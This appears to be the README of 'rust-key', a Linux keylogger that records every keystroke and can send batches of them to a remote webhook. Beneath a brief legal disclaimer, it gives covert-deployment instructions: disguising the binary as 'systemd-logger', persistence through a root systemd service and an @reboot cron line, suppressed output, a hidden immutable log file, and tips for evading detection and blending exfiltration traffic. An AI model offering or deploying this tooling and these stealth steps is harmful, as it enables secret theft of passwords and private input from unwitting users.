# rust-key

A cross-platform keylogger written in Rust with USB keyboard support.

## ⚠️ Legal Disclaimer

**This tool is for educational and authorized security testing purposes only.**

Unauthorized use of keyloggers may be illegal in your jurisdiction. Always obtain proper authorization before using this tool. The authors are not responsible for misuse or damage caused by this program.

## Features

- 🔌 **USB Keyboard Support**: Automatically detects and monitors USB keyboards
- 🐧 **Linux Support**: Full support for Arch Linux and other distributions using evdev
- 🌍 **Cross-Platform Ready**: Includes dependencies for Windows and macOS (implementations in progress)
- 🌐 **UTF-8 Default**: Configured for en_US.UTF-8 locale
- 📝 **Detailed Logging**: Timestamps and device information for each keystroke
- ⚡ **Low Overhead**: Efficient event-driven architecture
- 🔗 **Webhook Support**: Send keystrokes to a webhook URL via batched POST requests
- 📦 **Efficient Batching**: Groups keystrokes (up to 20) to minimize network requests
- 🔒 **Secure Output**: Keystrokes are not printed to console, only saved to file and optionally sent to webhook

## Platform Support

### Linux (Fully Supported)
- ✅ Arch Linux
- ✅ Ubuntu/Debian
- ✅ Fedora/RHEL
- ✅ Other distributions with evdev support
- ✅ USB keyboard detection and monitoring
- ✅ Multiple simultaneous keyboards

### Windows (Dependencies Included)
- 🚧 Implementation in progress
- Dependencies: winapi crate

### macOS (Dependencies Included)
- 🚧 Implementation in progress
- Dependencies: core-foundation, core-graphics crates

## Dependencies

### Linux (Arch Linux)
```bash
# Install Rust
sudo pacman -S rust cargo

# Ensure you have access to input devices
sudo usermod -a -G input $USER
# Log out and log back in for group changes to take effect

# Or run with sudo
```

### Linux (Debian/Ubuntu)
```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Install required packages
sudo apt-get update
sudo apt-get install build-essential pkg-config

# Add user to input group
sudo usermod -a -G input $USER
```

### Linux (Fedora/RHEL)
```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Install required packages
sudo dnf groupinstall "Development Tools"

# Add user to input group
sudo usermod -a -G input $USER
```

## Building

### For Linux (default)
```bash
cargo build --release
```

### For Windows
```bash
cargo build --release --target x86_64-pc-windows-msvc
```

### For macOS
```bash
cargo build --release --target x86_64-apple-darwin
```

## Usage

### Linux
```bash
# Basic usage (logs to keylog.txt only)
sudo ./target/release/rust-key

# With webhook support (sends keys to webhook URL via POST)
sudo ./target/release/rust-key https://webhook.site/your-unique-id

# Or add your user to the input group first
sudo usermod -a -G input $USER
# Log out and log back in
./target/release/rust-key [WEBHOOK_URL]
```

The program will:
1. Set the default locale to en_US.UTF-8
2. Scan for all input devices (including USB keyboards)
3. Display detected keyboard devices with their type (USB/Internal)
4. Start monitoring all keyboards
5. Log keystrokes to `keylog.txt` with timestamps
6. Send keystrokes to webhook URL if provided (via POST request)

**Note:** Keystrokes are no longer printed to the console for security reasons. They are only saved to `keylog.txt` and optionally sent to a webhook.

### Windows
```bash
# Run as Administrator
.\target\release\rust-key.exe
```

### macOS
```bash
# Grant accessibility permissions first
# System Preferences > Security & Privacy > Privacy > Accessibility
sudo ./target/release/rust-key
```

## Output Format

Keystrokes are logged to `keylog.txt` in the following format:
```
=== Keylogger Started at 2024-01-01 12:00:00.000 ===
Locale: en_US.UTF-8
Webhook URL: https://webhook.site/your-unique-id
Monitoring device: AT Translated Set 2 keyboard (/dev/input/event3)
Monitoring device: USB Keyboard (/dev/input/event4)
[2024-01-01 12:00:05.123] [USB Keyboard] Key: h
[2024-01-01 12:00:05.234] [USB Keyboard] Key: e
[2024-01-01 12:00:05.345] [USB Keyboard] Key: l
[2024-01-01 12:00:05.456] [USB Keyboard] Key: l
[2024-01-01 12:00:05.567] [USB Keyboard] Key: o
```

If a webhook URL is provided, keystrokes are sent in batches as POST requests. The program batches up to 20 keystrokes and sends them either when the batch is full or after 2 seconds of inactivity. The JSON payload format is:
```json
{
  "keystrokes": [
    {
      "timestamp": "2024-01-01 12:00:05.123",
      "device": "USB Keyboard",
      "key": "h"
    },
    {
      "timestamp": "2024-01-01 12:00:05.234",
      "device": "USB Keyboard",
      "key": "e"
    },
    {
      "timestamp": "2024-01-01 12:00:05.345",
      "device": "USB Keyboard",
      "key": "l"
    }
  ]
}
```

This batching approach significantly reduces network overhead and makes the communication more efficient compared to sending individual keystrokes.

## Technical Details

### Linux Implementation
- Uses `evdev` crate to access `/dev/input/event*` devices
- Automatically detects USB keyboards by checking physical path
- Non-blocking event loop for efficient processing
- Supports multiple simultaneous keyboards
- Keystrokes are saved to `keylog.txt` but not printed to console
- Optional webhook support via `reqwest` crate for HTTP POST requests
- Webhook requests are sent asynchronously in batches to avoid blocking the keylogger
- Batching configuration:
  - Batch size: 20 keystrokes per request
  - Timeout: 2 seconds (sends partial batch if no new keys)
  - This reduces network overhead and improves efficiency
- Maps key codes to characters including:
  - Letters (a-z)
  - Numbers (0-9)
  - Special keys (Enter, Tab, Space, etc.)
  - Punctuation
  - Arrow keys
  - Function keys (F1-F12)

### USB Detection
The program identifies USB keyboards by examining the device's physical path:
- Physical path containing "usb" → Marked as USB keyboard
- All keyboard devices are monitored regardless of type
- Device information is logged for reference

## Permissions

### Linux
The program requires access to `/dev/input/event*` devices. You can either:

1. **Run with sudo** (simplest):
   ```bash
   sudo ./target/release/rust-key
   ```

2. **Add user to input group** (more secure):
   ```bash
   sudo usermod -a -G input $USER
   # Log out and log back in
   ./target/release/rust-key
   ```

## Process Hiding Techniques (Educational Purposes Only)

**⚠️ IMPORTANT:** These techniques are provided solely for educational and authorized security testing purposes. Use only on systems you own or have explicit written permission to test.

### Linux Process Obfuscation

#### 1. Rename the Binary
Give the process a legitimate-sounding name that blends in with system processes:
```bash
# Copy and rename the binary
cp target/release/rust-key target/release/systemd-logger

# Run with the new name
sudo ./target/release/systemd-logger https://your-webhook-url
```

Common legitimate-sounding process names:
- `systemd-logger`
- `update-notifier`
- `dbus-monitor`
- `gnome-settings`
- `init-helper`

#### 2. Run in Background with Nohup
Detach the process from the terminal and continue running after logout:
```bash
# Run in background, immune to hangups, with output redirected
nohup sudo ./target/release/systemd-logger https://your-webhook-url > /dev/null 2>&1 &

# Check if it's running
ps aux | grep systemd-logger
```

#### 3. Create a Systemd Service
For persistent execution that survives reboots:

Create `/etc/systemd/system/system-logger.service`:
```ini
[Unit]
Description=System Event Logger
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/systemd-logger https://your-webhook-url
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
```

Then install and enable:
```bash
# Copy binary to system location
sudo cp target/release/rust-key /usr/local/bin/systemd-logger

# Enable and start the service
sudo systemctl daemon-reload
sudo systemctl enable system-logger.service
sudo systemctl start system-logger.service

# Check status
sudo systemctl status system-logger.service
```

#### 4. Run at Startup with Cron
Add to root's crontab for automatic startup:
```bash
# Edit root's crontab
sudo crontab -e

# Add this line:
@reboot /usr/local/bin/systemd-logger https://your-webhook-url > /dev/null 2>&1 &
```

#### 5. Suppress Output
Ensure no terminal output that could reveal the process:
```bash
# Redirect all output to /dev/null
sudo ./rust-key https://webhook-url > /dev/null 2>&1 &

# Or use the `daemon` command if available
daemon -- ./rust-key https://webhook-url
```

#### 6. Hide from Process Lists (Advanced)
Note: This is for educational understanding only. Rootkit-like behavior may trigger security software.

```bash
# Change process title (requires code modification)
# This would need to be implemented in the Rust code using prctl crate

# Hide log file
sudo chattr +i keylog.txt  # Make immutable (prevents modification/deletion until flag is removed)
mv keylog.txt .keylog.txt  # Hidden file (starts with dot)
```

### Detection Evasion Tips

1. **Legitimate Placement**: Place the binary in common binary directories:
   - `/usr/local/bin/`
   - `/usr/bin/`
   - `/opt/local/bin/`

2. **Timing**: Start the process during system startup when many processes are launching.

3. **Minimal Footprint**: 
   - Use webhook instead of large log files
   - Redirect logs to `/dev/null` or rotate them frequently
   - Minimize CPU usage (already done by the efficient design)

4. **Network Stealth**:
   - Use HTTPS webhooks to encrypt traffic
   - Batch requests (already implemented) to reduce network activity
   - Use common webhook services that blend with normal traffic

### Removal/Cleanup

If you've installed using the above methods, clean up properly:
```bash
# Stop and disable systemd service
sudo systemctl stop system-logger.service
sudo systemctl disable system-logger.service
sudo rm /etc/systemd/system/system-logger.service
sudo systemctl daemon-reload

# Remove binary
sudo rm /usr/local/bin/systemd-logger

# Remove cron job
sudo crontab -e  # Then manually delete the line

# Kill any running processes
sudo pkill -f rust-key
sudo pkill -f systemd-logger

# Remove log files
rm keylog.txt
rm .keylog.txt
```

## Security Considerations

- This tool captures all keyboard input, including passwords
- The log file contains sensitive information
- If using webhook functionality, ensure the webhook URL is secure (HTTPS recommended)
- Webhook data is transmitted over the network - use trusted endpoints only
- Always secure the log file with appropriate permissions
- Delete or encrypt logs when no longer needed
- Only use on systems you own or have explicit permission to monitor
- Be aware of your local laws regarding keylogging

## Development Status

- ✅ Linux/evdev implementation complete
- ✅ USB keyboard detection complete
- ✅ en_US.UTF-8 locale support complete
- ✅ Cross-platform dependency structure complete
- ✅ Webhook support for sending keystrokes via HTTP POST
- ✅ Batch processing for webhook requests (20 keystrokes per batch)
- ✅ Removed console output of keystrokes for security
- 🚧 Windows implementation (stub ready)
- 🚧 macOS implementation (stub ready)

## Contributing

Contributions are welcome! Areas for contribution:
- Complete Windows implementation using winapi
- Complete macOS implementation using Core Graphics
- Add encryption for log files
- Add support for additional webhook formats or authentication methods
- Improve key mapping for different keyboard layouts
- Add configuration file support

## License

MIT License - See LICENSE file for details

## Author

LangerSword

## Support

For issues, questions, or contributions:
- GitHub: https://github.com/LangerSword/rust-key
- Open an issue on GitHub for bug reports or feature requests
